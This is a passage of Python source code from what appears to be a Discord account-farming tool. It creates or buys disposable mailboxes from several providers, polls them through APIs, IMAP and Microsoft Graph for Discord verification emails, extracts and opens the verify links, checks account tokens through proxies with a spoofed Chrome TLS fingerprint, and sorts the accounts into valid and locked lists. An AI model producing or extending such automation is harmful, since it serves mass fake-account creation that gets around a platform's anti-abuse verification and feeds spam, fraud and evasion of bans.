                                "domain": use_domain
                            }
                        elif data.get("email"):
                            return {
                                "success": True,
                                "email": data.get("email"),
                                "username": username,
                                "domain": use_domain
                            }
                        else:
                            email = f"{username}@{use_domain}"
                            return {
                                "success": True,
                                "email": email,
                                "username": username,
                                "domain": use_domain
                            }
                except json.JSONDecodeError:
                    if resp.status_code == 201:
                        email = f"{username}@{use_domain}"
                        return {
                            "success": True,
                            "email": email,
                            "username": username,
                            "domain": use_domain
                        }
                    return {"success": False, "error": f"Invalid JSON response: {resp.text[:100]}"}
            
            return {"success": False, "error": f"HTTP {resp.status_code}: {resp.text[:100]}"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def get_inbox(self, email: str) -> list:
        try:
            resp = self.session.get(f"{self.base_url}/inbox/{email}", timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, list):
                    return data
                elif isinstance(data, dict) and data.get("messages"):
                    return data.get("messages", [])
                elif isinstance(data, dict) and data.get("emails"):
                    return data.get("emails", [])
            return []
        except Exception:
            return []

class PublicTempInboxAPI:
    def __init__(self, api_key: str = None, domain: str = None, api_base: str = None):
        self.api_key = api_key
        self.domain = domain or "durudraxon.online"
        self.base_url = api_base or "https://mail.draxono.in"
        self.client = httpx.Client(verify=False, timeout=30, follow_redirects=True)
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }
        if self.api_key:
            headers['X-API-KEY'] = self.api_key
        self.client.headers.update(headers)
    
    def _request(self, method: str, endpoint: str, **kwargs) -> Dict[str, Any]:
        url = f"{self.base_url}{endpoint}"
        try:
            response = self.client.request(method, url, **kwargs)
            try:
                data = response.json()
            except json.JSONDecodeError:
                log.warning(f"Invalid JSON response from Public Temp Inbox: {response.text[:200]}")
                return {"success": False, "error": "Invalid response"}
            
            if not response.is_success:
                if isinstance(data, dict):
                    error_msg = data.get('error', data.get('message', f"HTTP {response.status_code}"))
                else:
                    error_msg = f"HTTP {response.status_code}"
                log.warning(f"Public Temp Inbox API error: {error_msg}")
                return {"success": False, "error": error_msg}
            
            return data
        except (httpx.RequestError, httpx.HTTPError) as e:
            log.warning(f"Public Temp Inbox connection error: {str(e)}")
            return {"success": False, "error": str(e)}
    
    def generate_email(self, domain: str = None, domains_list: list = None) -> Dict[str, Any]:
        if domains_list and len(domains_list) > 0:
            email_domain = random.choice(domains_list)
        elif domain:
            email_domain = domain
        else:
            email_domain = self.domain
        
        random_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        random_password = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%', k=16))
        
        email = f"{random_user}@{email_domain}"
        
        claim_result = self.claim_inbox(email, random_password)
        
        if claim_result.get("success"):
            return {
                "success": True,
                "email": email,
                "password": random_password,
                "access_code": random_user,
                "inbox_id": email
            }
        
        return claim_result
    
    def claim_inbox(self, email: str, password: str) -> Dict[str, Any]:
        try:
            payload = {
                "email": email,
                "password": password
            }
            result = self._request('POST', f'/api/v1/inbox/{email}/claim', json=payload)
            
            if result.get("success") or not result.get("error"):
                return {
                    "success": True,
                    "email": email,
                    "password": password
                }
            return result
        except Exception as e:
            log.warning(f"Failed to claim inbox: {e}")
            return {"success": False, "error": str(e)}
    
    def get_inbox(self, email: str, password: str = None) -> List[Dict[str, Any]]:
        payload = {
            "address": email,
            "password": password or ""
        }
        result = self._request('POST', f'/api/v1/inbox/{email}', json=payload)
        
        if isinstance(result, list):
            return result
        elif isinstance(result, dict) and result.get('success'):
            return result.get('messages', [])
        return []
    
    def get_message(self, email: str, password: str = None) -> Dict[str, Any]:
        payload = {
            "address": email,
            "password": password or ""
        }
        return self._request('POST', f'/api/v1/inbox/{email}', json=payload)

def show_balance_and_stock():
    provider_name = config.get("email_provider", {}).get("name", "").lower()
    
    if provider_name == "hotmail007":
        client_key = config.get("email_provider", {}).get("client_key", "").strip()
        if client_key:
            api = Hotmail007API(client_key)
            balance = api.check_balance()
            if balance > 0:
                log.success(f"Hotmail007 Balance: ${balance:.2f}")
            for mail_type in ["outlook Trusted", "hotmail"]:
                stock = api.get_stock(mail_type)
                if stock > 0:
                    pass
                    
    elif provider_name == "zeusx":
        api_key = config.get("email_provider", {}).get("api_key", "").strip()
        if api_key:
            api = ZeusXAPI(api_key)
            balance = api.check_balance()
            log.success(f"ZeusX Balance: {balance}")
            stock = api.get_stock()
            pass
    
    elif provider_name == "public temp inbox":
        api_key = config.get("email_provider", {}).get("api_key", "").strip()
        if api_key:
            domain = config.get("email_provider", {}).get("domain", "durudraxon.online")
            api_base = config.get("email_provider", {}).get("api_base", "https://mail.draxono.in")
            api = PublicTempInboxAPI(api_key, domain, api_base)

class MailcowAPI:
    def __init__(self, mailcow_url: str, api_key: str, imap_host: str, domains: list = None):
        self.mailcow_url = mailcow_url.rstrip("/")
        self.api_key = api_key
        self.imap_host = imap_host
        self.session = requests.Session()
        self.session.verify = False
        from urllib3.util.retry import Retry
        from requests.adapters import HTTPAdapter
        retry_strategy = Retry(total=3, backoff_factor=2, status_forcelist=[502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount('https://', adapter)
        self.session.mount('http://', adapter)
        self.domains = domains or []
    
    def create_mailbox(self, password: str = None) -> dict:
        domains = self.domains
        if not domains:
            return {"success": False, "error": "No domains configured"}
        
        domain = random.choice(domains)
        local_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        mail_password = password or generate_password(16)
        
        payload = {
            "active": "1",
            "domain": domain,
            "local_part": local_part,
            "name": local_part,
            "password": mail_password,
            "password2": mail_password,
            "quota": "1024",
            "tls_enforce_in": "1",
            "tls_enforce_out": "1",
        }
        
        max_attempts = 5
        for attempt in range(1, max_attempts + 1):
            try:
                resp = self.session.post(
                    f"{self.mailcow_url}/api/v1/add/mailbox",
                    json=payload,
                    headers={
                        "X-API-Key": self.api_key,
                        "Content-Type": "application/json",
                    },
                    timeout=30,
                )
                
                data = resp.json()
                success = False
                if isinstance(data, list):
                    success = any(r.get("type") == "success" for r in data)
                elif isinstance(data, dict):
                    success = data.get("status") == "success" or data.get("type") == "success"
                
                if success:
                    email_addr = f"{local_part}@{domain}"
                    log.success(f"✓ Mailcow mailbox created: {email_addr}")
                    return {
                        "success": True,
                        "email": email_addr,
                        "password": mail_password,
                        "token": "",
                        "uuid": "",
                    }
            except Exception as e:
                pass
            
            if attempt < max_attempts:
                time.sleep(0.5)
        
        return {"success": False, "error": "All retry attempts failed"}
    
    def buy_email(self) -> dict:
        return self.create_mailbox()

    def read_inbox_imap(self, email_addr: str, password: str, retries: int = 10, delay_sec: int = 5) -> Optional[str]:
        def _try_extract(mail_conn) -> Optional[str]:
            try:
                _, raw_folders = mail_conn.list()
                server_folders = []
                for f in raw_folders:
                    if not f:
                        continue
                    decoded = f.decode() if isinstance(f, bytes) else f
                    token = decoded.strip().rsplit(None, 1)[-1].strip().strip('"')
                    if token and token not in server_folders:
                        server_folders.append(token)
            except Exception:
                server_folders = ["INBOX", "Junk", "Spam"]

            priority = []
            for candidate in ["Junk", "Spam", "INBOX"]:
                for sf in server_folders:
                    if candidate.lower() in sf.lower() and sf not in priority:
                        priority.append(sf)
            for sf in server_folders:
                if sf not in priority:
                    priority.append(sf)

            for folder in priority:
                try:
                    status, _ = mail_conn.select(folder, readonly=True)
                    if status != "OK":
                        continue

                    found_ids = b""
                    for criteria in ("UNSEEN", "ALL"):
                        _, msg_nums = mail_conn.search(None, criteria)
                        if msg_nums and msg_nums[0]:
                            found_ids = msg_nums[0]
                            break

                    if not found_ids:
                        continue

                    msg_ids = found_ids.split()[-5:]

                    for msg_id in reversed(msg_ids):
                        try:
                            _, msg_data = mail_conn.fetch(msg_id, "(RFC822)")
                            if not msg_data or not isinstance(msg_data[0], tuple):
                                continue
                            raw_email = msg_data[0][1]
                            if not isinstance(raw_email, bytes):
                                continue
                        except Exception as fe:
                            continue

                        parsed = email_module.message_from_bytes(raw_email)

                        subject = ""
                        raw_subject = parsed.get("Subject", "")
                        if raw_subject:
                            for part, enc in decode_header(raw_subject):
                                if isinstance(part, bytes):
                                    subject += part.decode(enc or "utf-8", errors="replace")
                                else:
                                    subject += part

                        from_addr = parsed.get("From", "").lower()
                        subject_lower = subject.lower()

                        is_discord = "discord" in from_addr
                        is_verify  = any(w in subject_lower for w in ("verify", "confirm", "email"))

                        if not (is_discord and is_verify):
                            continue

                        log.success("Found Discord verification email!")

                        body_html = body_text = ""
                        if parsed.is_multipart():
                            for part in parsed.walk():
                                ctype   = part.get_content_type()
                                payload = part.get_payload(decode=True)
                                if payload:
                                    charset = part.get_content_charset() or "utf-8"
                                    text    = payload.decode(charset, errors="replace")
                                    if ctype == "text/html":
                                        body_html += text
                                    elif ctype == "text/plain":
                                        body_text += text
                        else:
                            payload = parsed.get_payload(decode=True)
                            if payload:
                                charset = parsed.get_content_charset() or "utf-8"
                                text    = payload.decode(charset, errors="replace")
                                if parsed.get_content_type() == "text/html":
                                    body_html = text
                                else:
                                    body_text = text

                        combined = body_html + body_text

                        direct = re.search(r'https://discord\.com/verify\?token=[^"\'><\s]+', combined)
                        if direct:
                            return direct.group(0)

                        for m in re.finditer(r'https://(?:click|links)\.discord\.com[^\s"\'<>]+', combined):
                            try:
                                resp = requests.get(m.group(0), allow_redirects=True, verify=False, timeout=10)
                                if "discord.com/verify" in resp.url:
                                    return resp.url
                                bm = re.search(r'https://discord\.com/verify\?token=[^"\'><\s]+', resp.text)
                                if bm:
                                    return bm.group(0)
                            except Exception:
                                pass

                except Exception as e:
                    pass

            return None

        mail = None
        first_attempt = True
        
        for attempt in range(1, retries + 1):
            try:
                if mail is None:
                    ports_to_try = [993, 143, 9993]
                    mail = None
                    last_error = None
                    connected = False
                    
                    for port in ports_to_try:
                        try:
                            if port == 143:
                                mail = imaplib.IMAP4(self.imap_host, port, timeout=10)
                                mail.starttls()
                            else:
                                mail = imaplib.IMAP4_SSL(self.imap_host, port, timeout=10)
                            
                            mail.login(email_addr, password)
                            connected = True
                            if first_attempt:
                                log.success(f"✓ IMAP connected on port {port}")
                                first_attempt = False
                            break
                        except imaplib.IMAP4.error as imap_error:
                            last_error = imap_error
                            mail = None
                            continue
                        except Exception as port_error:
                            last_error = port_error
                            mail = None
                            continue
                    
                    if not connected:
                        error_msg = str(last_error) if last_error else "Unknown error"
                        
                        if attempt == 1:
                            try:
                                import socket
                                ip = socket.gethostbyname(self.imap_host)
                            except socket.gaierror as dns_err:
                                log.error(f"  → DNS resolution failed: {dns_err}")
                        
                        if attempt < retries:
                            time.sleep(delay_sec)
                        continue

                result = _try_extract(mail)
                if result:
                    try:
                        mail.logout()
                    except Exception:
                        pass
                    return result

            except Exception as e:
                log.warning(f"IMAP extraction error: {e}")
                try:
                    if mail:
                        mail.logout()
                except Exception:
                    pass
                mail = None

            if attempt < retries:
                time.sleep(delay_sec)

        if mail:
            try:
                mail.logout()
            except Exception:
                pass

        return None

MS_CLIENT_ID = ""

def get_access_token(refresh_token: str, client_id: str, proxy_config: Dict = None) -> Optional[str]:
    try:
        session = requests.Session()
        session.verify = False
        
        if proxy_config:
            proxy_dict = get_session_proxy(proxy_config)
            if proxy_dict:
                session.proxies.update(proxy_dict)
        
        response = session.post(
            "https://login.microsoftonline.com/common/oauth2/v2.0/token",
            data={
                "client_id": client_id,
                "refresh_token": refresh_token,
                "grant_type": "refresh_token",
                "scope": "https://graph.microsoft.com/.default"
            },
            timeout=30
        )
        result = response.json()
        return result.get("access_token")
    except Exception as e:
        return None

def fetch_verification_url(email_data: Dict, timeout: int = 15, proxy_config: Dict = None) -> Optional[str]:
    refresh_token = email_data.get("token", "")
    client_id = email_data.get("uuid", "") or MS_CLIENT_ID
    
    access_token = get_access_token(refresh_token, client_id, proxy_config)
    if not access_token:
        log.error("Failed to get Graph access token")
        return None
    
    start_time = time.time()
    attempt = 0
    
    session = requests.Session()
    session.verify = False
    
    if proxy_config:
        proxy_dict = get_session_proxy(proxy_config)
        if proxy_dict:
            session.proxies.update(proxy_dict)
    
    while (time.time() - start_time) < timeout:
        attempt += 1
        try:
            response = session.get(
                "https://graph.microsoft.com/v1.0/me/messages",
                headers={"Authorization": f"Bearer {access_token}"},
                params={
                    "$top": 5,
                    "$orderby": "receivedDateTime desc",
                    "$select": "subject,body,from,bodyPreview,receivedDateTime"
                },
                timeout=15
            )
            emails = response.json().get("value", [])
            
            if attempt % 5 == 0:
                elapsed = int(time.time() - start_time)
            
            for email in emails:
                subject = email.get("subject", "").lower()
                from_addr = email.get("from", {}).get("emailAddress", {}).get("address", "").lower()
                
                is_verify_email = (
                    ("verify" in subject or "confirm" in subject or "email" in subject) and
                    ("discord" in from_addr or "noreply@discord.com" in from_addr)
                )
                
                if not is_verify_email:
                    continue
                
                body_html = email.get("body", {}).get("content", "")
                
                verify_pattern = r'https://discord\.com/verify\?token=[^"\'\>\s]+'
                direct_match = re.search(verify_pattern, body_html)
                if direct_match:
                    log.success("Found verify link in email!")
                    return direct_match.group(0)
                
                click_patterns = [
                    r'https://click\.discord\.com/ls/click\?[^"\'\>\s]+',
                    r'https://links\.discord\.com[^"\'\>\s]+'
                ]
                
                for pat in click_patterns:
                    for m in re.finditer(pat, body_html):
                        url = m.group(0)
                        try:
                            resp = session.get(url, allow_redirects=True, timeout=10)
                            final_url = resp.url
                            
                            if "discord.com/verify" in final_url:
                                log.success("Found verify link via redirect!")
                                return final_url
                            
                            verify_in_body = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s]+', resp.text)
                            if verify_in_body:
                                log.success("Found verify link in response body!")
                                return verify_in_body.group(0)
                        except:
                            pass
                
                log.warning("Discord email found but no valid verify link")
                    
        except Exception as e:
            log.warning(f"Graph API error: {e}")
        
        time.sleep(3)
    
    log.warning("Verification email not found after timeout")
    return None

async def verify_email_with_url(browser, verify_url: str, token: str, timeout: int = 60) -> bool:
    if not verify_url:
        return False
    
    try:
        page = await browser.get(verify_url)
        await asyncio.sleep(5)
        
        for _ in range(timeout // 5):
            await asyncio.sleep(5)
            verified, _ = check_email_verified_api(token)
            if verified:
                return True
        
        return True
    except Exception as e:
        log.warning(f"Error opening verification URL: {e}")
        return False

async def verify_email_hotmail007(email: str, refresh_token: str, client_id: str, browser, token: str, proxy_config: Dict = None, timeout: int = 15) -> bool:
    email_data = {
        "email": email,
        "token": refresh_token,
        "uuid": client_id
    }
    
    verify_url = fetch_verification_url(email_data, timeout, proxy_config)
    
    if verify_url:
        return await verify_email_with_url(browser, verify_url, token)
    
    log.warning("Verification email not found after timeout")
    return False

async def verify_email_leveragers(email: str, password: str, browser, token: str, api_key: str, timeout: int = 15) -> bool:
    api = MailAPI(api_key=api_key)
    start_time = time.time()
    
    while (time.time() - start_time) < timeout:
        try:
            if password:
                inbox = api.get_private_inbox(email, password)
            else:
                inbox = api.get_inbox(email)
            
            for msg in inbox:
                subject = msg.get("subject", "").lower()
                if "verify" in subject or "confirm" in subject or "discord" in subject or "email" in subject:
                    body = msg.get("body", "") or msg.get("html", "") or msg.get("text", "")
                    
                    verify_pattern = r'https://discord\.com/verify\?token=[^"\'\>\s]+'
                    direct_match = re.search(verify_pattern, body)
                    if direct_match:
                        verify_url = direct_match.group(0)
                        log.success("Found verify link in email!")
                        return await verify_email_with_url(browser, verify_url, token)
        except Exception:
            pass
        
        await asyncio.sleep(5)
    
    log.warning("Verification email not found after timeout")
    return False

async def verify_email_venumzmail(email: str, api_key: str, browser, token: str, domain: str = None, api_base: str = None, timeout: int = 60) -> bool:
    api = VenumzMailAPI(api_key=api_key, domain=domain, api_base=api_base)
    start_time = time.time()
    
    while (time.time() - start_time) < timeout:
        try:
            resp = api.session.get(f"{api.base_url}/inbox/{email}", timeout=60)
            
            if resp.status_code == 200:
                data = resp.json()
                messages = data.get("messages", [])
                
                if not messages:
                    await asyncio.sleep(5)
                    continue
                
                for msg in messages:
                    sender = msg.get("sender", "").lower()
                    subject = msg.get("subject", "").lower()
                    
                    if "discord" not in sender and "discord" not in subject:
                        continue
                    
                    if "verify" not in subject and "confirm" not in subject and "email" not in subject:
                        continue
                    
                    log.success(f"Found Discord verification email from {sender}")
                    
                    body = msg.get("body", "")
                    body_html = msg.get("body_html", "")
                    combined = body + " " + body_html
                    
                    verify_pattern = r'https?://discord\.com/verify\?token=[a-zA-Z0-9_\-\.]+'
                    match = re.search(verify_pattern, combined)
                    
                    if match:
                        verify_url = match.group(0)
                        log.success(f"Found verification URL!")
                        return await verify_email_with_url(browser, verify_url, token)
                    
                    click_patterns = [
                        r'https?://click\.discord\.com/ls/click\?[^\s"\'<>]+',
                        r'https?://links\.discord\.com[^\s"\'<>]+',
                        r'https?://cdn\.discordapp\.com[^\s"\'<>]+'
                    ]
                    
                    for pattern in click_patterns:
                        for match in re.finditer(pattern, combined):
                            url = match.group(0)
                            try:
                                session_req = requests.Session()
                                session_req.verify = False
                                resp_req = session_req.get(url, allow_redirects=True, timeout=10)
                                final_url = resp_req.url
                                
                                if "discord.com/verify" in final_url:
                                    log.success("Found verification URL via redirect!")
                                    return await verify_email_with_url(browser, final_url, token)
                                
                                verify_in_body = re.search(r'https?://discord\.com/verify\?token=[a-zA-Z0-9_\-\.]+', resp_req.text)
                                if verify_in_body:
                                    log.success("Found verification URL in redirect response!")
                                    return await verify_email_with_url(browser, verify_in_body.group(0), token)
                            except Exception:
                                continue
                    
                    token_pattern = r'token[=:][\s]*["\']?([a-zA-Z0-9_\-\.]+)["\']?'
                    token_match = re.search(token_pattern, combined, re.IGNORECASE)
                    if token_match:
                        extracted_token = token_match.group(1)
                        if '.' in extracted_token and len(extracted_token) > 50:
                            verify_url = f"https://discord.com/verify?token={extracted_token}"
                            log.success("Found verification token in email!")
                            return await verify_email_with_url(browser, verify_url, token)
                    
                    log.warning("Discord email found but no verification URL extracted")
            
            await asyncio.sleep(5)
            
        except Exception as e:
            log.debug(f"VenumzMail check error: {e}")
            await asyncio.sleep(5)
    
    log.warning(f"Discord verification email not found after {timeout} seconds")
    return False

async def verify_email_public_temp_inbox(email: str, password: str, browser, token: str, api_key: str, domain: str = None, api_base: str = None, timeout: int = 15) -> bool:
    email_domain = domain or (email.split('@')[1] if '@' in email else "durudraxon.online")
    api = PublicTempInboxAPI(api_key=api_key, domain=email_domain, api_base=api_base)
    start_time = time.time()
    
    while (time.time() - start_time) < timeout:
        try:
            inbox = api.get_inbox(email, password)
            
            if not isinstance(inbox, list):
                inbox = []
            
            for msg in inbox:
                subject = msg.get("subject", "").lower()
                from_addr = msg.get("from", "").lower()
                
                is_verify_email = (
                    ("verify" in subject or "confirm" in subject or "email" in subject or "discord" in subject) and
                    ("discord" in from_addr or "noreply@discord.com" in from_addr)
                )
                
                if not is_verify_email:
                    continue
                
                body = msg.get("html", "") or msg.get("text", "") or msg.get("body", "") or msg.get("content", "")
                
                verify_pattern = r'https://discord\.com/verify\?token=[^"\'\>\s]+'
                direct_match = re.search(verify_pattern, body)
                if direct_match:
                    verify_url = direct_match.group(0)
                    log.success("Found verify link in email!")
                    return await verify_email_with_url(browser, verify_url, token)
                
                click_patterns = [
                    r'https://click\.discord\.com/ls/click\?[^"\'\>\s]+',
                    r'https://links\.discord\.com[^"\'\>\s]+'
                ]
                
                for pat in click_patterns:
                    for m in re.finditer(pat, body):
                        url = m.group(0)
                        try:
                            session = requests.Session()
                            session.verify = False
                            resp = session.get(url, allow_redirects=True, timeout=10)
                            final_url = resp.url
                            
                            if "discord.com/verify" in final_url:
                                log.success("Found verify link via redirect!")
                                return await verify_email_with_url(browser, final_url, token)
                            
                            verify_in_body = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s]+', resp.text)
                            if verify_in_body:
                                log.success("Found verify link in response body!")
                                return await verify_email_with_url(browser, verify_in_body.group(0), token)
                        except:
                            pass
                
                log.warning("Discord email found but no valid verify link")
        
        except Exception as e:
            pass
        
        await asyncio.sleep(5)
    
    log.warning("Verification email not found after timeout")
    return False

async def verify_email_mailcow(email_addr: str, password: str, browser, token: str, config: dict, timeout: int = 15) -> bool:
    mc_config = config.get("email_providers", {}).get("mailcow", {})
    if not mc_config:
        mc_config = config.get("email_api", {}).get("mailcow", {})
    
    mailcow_url = mc_config.get("mailcow_url", "").strip()
    api_key = mc_config.get("api_key", "").strip()
    imap_host = mc_config.get("imap_host", "").strip()
    domains = mc_config.get("domains", [])
    
    api = MailcowAPI(mailcow_url, api_key, imap_host, domains)
    retries = max(1, timeout // 5)
    
    verify_url = await asyncio.to_thread(api.read_inbox_imap, email_addr, password, retries, 5)
    
    if verify_url:
        return await verify_email_with_url(browser, verify_url, token)
    
    log.warning("Verification email not found after timeout")
    return False

def get_hotmail007_email(config: dict) -> tuple:
    h_config = config.get("email_providers", {}).get("hotmail007", {})
    if not h_config:
        h_config = config.get("email_provider", {})
    
    client_key = h_config.get("client_key", "").strip()
    
    if not client_key:
        log.warning("No Hotmail007 client_key configured")
        return None, None, None, None
    
    api = Hotmail007API(client_key)
    result = api.buy_email()
    
    if result.get("success"):
        return (
            result.get("email"),
            result.get("password"),
            result.get("token", ""),
            result.get("uuid", "")
        )
    else:
        log.error(f"Failed to purchase email: {result.get('error', 'Unknown')}")
        return None, None, None, None

def get_zeusx_email(config: dict) -> tuple:
    z_config = config.get("email_providers", {}).get("zeusx", {})
    if not z_config:
        z_config = config.get("email_provider", {})
    
    api_key = z_config.get("api_key", "").strip()
    if not api_key:
        log.warning("No ZeusX api_key configured")
        return None, None, None, None
    api = ZeusXAPI(api_key)
    result = api.buy_email()
    if result.get("success"):
        return (
            result.get("email"),
            result.get("password"),
            result.get("token", ""),
            result.get("uuid", "")
        )
    else:
        log.error(f"Failed to purchase email: {result.get('error', 'Unknown')}")
        return None, None, None, None

def get_leveragers_email(config: dict) -> tuple:
    l_config = config.get("email_providers", {}).get("leveragers", {})
    if not l_config:
        l_config = config.get("email_provider", {})
    
    api_key = l_config.get("api_key", "").strip()
    if not api_key:
        log.warning("No Leveragers api_key configured")
        return None, None, None, None
    api = MailAPI(api_key=api_key)
    try:
        domain = l_config.get("domain", "leveragers.xyz")
        res = api.generate_email(domain, is_private=True)
        if "email" in res:
            return (res.get("email"), res.get("password"), "", "")
        else:
            log.error(f"Leveragers error: {res}")
            return None, None, None, None
    except Exception as e:
        log.error(f"Failed to generate leveragers email: {e}")
        return None, None, None, None

def get_venumzmail_email(config: dict) -> tuple:
    v_config = config.get("email_providers", {}).get("venumzmail", {})
    if not v_config:
        v_config = config.get("email_provider", {})
    
    api_key = v_config.get("api_key", "").strip()
    if not api_key:
        log.warning("No VenumzMail api_key configured")
        return None, None, None, None
    
    domains_list = v_config.get("domains", ["lickingpussy.online"])
    domain = random.choice(domains_list)
    api_base = v_config.get("api_base", "https://api.venumzmail.xyz")
    
    for attempt in range(3):
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(12, 18)))
        
        payload = {
            "count": 1,
            "username": username,
            "domain": domain,
            "type": "public"
        }
        
        try:
            session = requests.Session()
            session.verify = False
            session.headers.update({
                'Content-Type': 'application/json',
                'x-api-key': api_key
            })
            
            resp = session.post(f"{api_base}/create", json=payload, timeout=60)
            
            if resp.status_code in [200, 201]:
                data = resp.json()
                if data.get("inboxes") and len(data["inboxes"]) > 0:
                    email = data["inboxes"][0].get("email")
                    if email:
                        log.success(f"✓ Got VenumzMail: {email}")
                        return (email, "", api_key, domain)
                email = f"{username}@{domain}"
                log.success(f"✓ Got VenumzMail: {email}")
                return (email, "", api_key, domain)
            else:
                log.debug(f"Attempt {attempt + 1} failed: HTTP {resp.status_code}")
        except Exception as e:
            log.debug(f"Attempt {attempt + 1} failed: {e}")
            continue
    
    log.error(f"VenumzMail error: All attempts failed")
    return None, None, None, None

def get_public_temp_inbox_email(config: dict) -> tuple:
    pti_config = config.get("email_providers", {}).get("draxono", {})
    if not pti_config:
        pti_config = config.get("email_providers", {}).get("public_temp_inbox", {})
    if not pti_config:
        pti_config = config.get("email_provider", {})
    
    api_key = pti_config.get("api_key", "").strip()
    if not api_key:
        log.warning("No Public Temp Inbox api_key configured")
        return None, None, None, None
    
    domain = pti_config.get("domain", "durudraxon.online")
    domains_list = pti_config.get("domains", [domain])
    api_base = pti_config.get("api_base", "https://mail.draxono.in")
    
    api = PublicTempInboxAPI(api_key=api_key, domain=domain, api_base=api_base)
    try:
        res = api.generate_email(domain=None, domains_list=domains_list)
        
        if res.get("success") and res.get("email"):
            return (
                res.get("email"),
                res.get("password", ""),
                res.get("access_code", res.get("token", "")),
                res.get("inbox_id", "")
            )
        elif res.get("email"):
            return (
                res.get("email"),
                res.get("password", ""),
                res.get("access_code", res.get("token", "")),
                res.get("inbox_id", "")
            )
        else:
            error_msg = res.get("error", "Failed to generate email")
            log.error(f"Public Temp Inbox error: {error_msg}")
            return None, None, None, None
    except Exception as e:
        log.error(f"Failed to generate Public Temp Inbox email: {e}")
        return None, None, None, None

def get_mailcow_email(config: dict) -> tuple:
    mc_config = config.get("email_providers", {}).get("mailcow", {})
    if not mc_config:
        mc_config = config.get("email_api", {}).get("mailcow", {})
    
    mailcow_url = mc_config.get("mailcow_url", "").strip()
    api_key = mc_config.get("api_key", "").strip()
    imap_host = mc_config.get("imap_host", "").strip()
    domains = mc_config.get("domains", [])
    
    if not mailcow_url or not api_key:
        log.warning(f"Mailcow config incomplete: url={bool(mailcow_url)}, key={bool(api_key)}")
        return None, None, None, None
    
    api = MailcowAPI(mailcow_url, api_key, imap_host, domains)
    mail_password = generate_form_password(10)
    result = api.create_mailbox(password=mail_password)
    
    if result.get("success"):
        return (
            result.get("email"),
            result.get("password"),
            "",
            ""
        )
    return None, None, None, None

def get_email_from_provider(config: dict) -> tuple:
    provider_selection = config.get("provider_selection", "").lower().strip()
    
    if provider_selection == "mailcow":
        email, password, token, uuid = get_mailcow_email(config)
        if email:
            return email, password, token, uuid, "mailcow"
    
    if provider_selection == "venumzmail":
        email, password, token, uuid = get_venumzmail_email(config)
        if email:
            return email, password, token, uuid, "venumzmail"
    
    mailcow_enabled = config.get("email_api", {}).get("mailcow", {}).get("enabled", False)
    if mailcow_enabled and not provider_selection:
        email, password, token, uuid = get_mailcow_email(config)
        if email:
            return email, password, token, uuid, "mailcow"
            
    provider_name = config.get("email_provider", {}).get("name", "").lower()
    
    if provider_selection == "hotmail007" or provider_name == "hotmail007":
        email, password, token, uuid = get_hotmail007_email(config)
        if email:
            return email, password, token, uuid, "hotmail007"
            
    elif provider_selection == "zeusx" or provider_name == "zeusx":
        email, password, token, uuid = get_zeusx_email(config)
        if email:
            return email, password, token, uuid, "zeusx"
            
    elif provider_selection == "leveragers" or provider_name == "leveragers":
        email, password, token, uuid = get_leveragers_email(config)
        if email:
            return email, password, token, uuid, "leveragers"
    
    elif provider_selection in ["public temp inbox", "draxono"] or provider_name == "public temp inbox":
        email, password, token, uuid = get_public_temp_inbox_email(config)
        if email:
            return email, password, token, uuid, "public temp inbox"
    
    log.error("No email provider available or all failed")
    return None, None, None, None, None

def generate_username() -> str:
    adjectives = ['cool', 'epic', 'super', 'mega', 'ultra', 'pro', 'elite', 'master', 'dark', 'light', 'shadow', 'fire', 'ice', 'storm', 'thunder', 'wild', 'crazy', 'fast', 'smart', 'great', 'best', 'top', 'king', 'queen', 'lord', 'sir', 'dame', 'captain', 'general', 'chief', 'major', 'agent', 'spy', 'hunter', 'scout', 'ranger', 'knight', 'wizard', 'mage', 'druid', 'rogue', 'bard', 'cleric', 'paladin', 'warrior', 'berserker', 'guardian', 'sentinel', 'watcher', 'keeper', 'warden']
    nouns = ['gamer', 'player', 'user', 'hero', 'legend', 'champion', 'warrior', 'hunter', 'ranger', 'knight', 'mage', 'rogue', 'bard', 'druid', 'cleric', 'paladin', 'berserker', 'guardian', 'sentinel', 'watcher', 'keeper', 'warden', 'dragon', 'phoenix', 'wolf', 'tiger', 'lion', 'hawk', 'eagle', 'raven', 'falcon', 'viper', 'cobra', 'python', 'shark', 'dolphin', 'whale', 'bear', 'panda', 'fox', 'deer', 'stag', 'horse', 'unicorn', 'pegasus', 'griffin', 'chimera', 'hydra', 'behemoth', 'leviathan', 'zephyr', 'tempest', 'cyclone', 'hurricane', 'typhoon', 'blizzard', 'avalanche', 'volcano', 'earthquake', 'tsunami']
    
    adj = random.choice(adjectives)
    noun = random.choice(nouns)
    numbers = ''.join(str(random.randint(0, 9)) for _ in range(10))
    
    return f"{adj}{noun}{numbers}"

def generate_password(length: int = 16) -> str:
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    password = ''.join(random.choices(chars, k=length))
    if not any(c.isupper() for c in password):
        password = password[:1].upper() + password[1:]
    if not any(c.isdigit() for c in password):
        password = password[:-1] + str(random.randint(0, 9))
    return password

def generate_form_password(min_length: int = 8) -> str:
    length = max(min_length, 8)
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    password = ''.join(random.choices(chars, k=length))
    if not any(c.isupper() for c in password):
        password = random.choice(string.ascii_uppercase) + password[1:]
    if not any(c.isdigit() for c in password):
        password = password[:-1] + random.choice(string.digits)
    return password

def check_token(token: str, proxy_config: Dict = None) -> str:
    try:
        session = tls_client.Session(client_identifier="chrome_138")
        if proxy_config:
            proxy_dict = get_session_proxy(proxy_config)
            if proxy_dict:
                session.proxies = proxy_dict
        headers = {'Authorization': token}
        response = session.get('https://discordapp.com/api/v9/users/@me/library', headers=headers)
        if response.status_code == 200:
            return 'VALID'
        elif response.status_code == 403:
            return 'LOCKED'
        elif response.status_code == 401:
            return 'INVALID'
        else:
            return 'INVALID'
    except:
        return 'ERROR'

def save_account_to_file(email: str, password: str, token: str, status: str):
    try:
        if status == 'VALID':
            output_file = OUTPUT_DIR / "valid.txt"
        elif status == 'LOCKED':
            output_file = OUTPUT_DIR / "locked.txt"
        else:
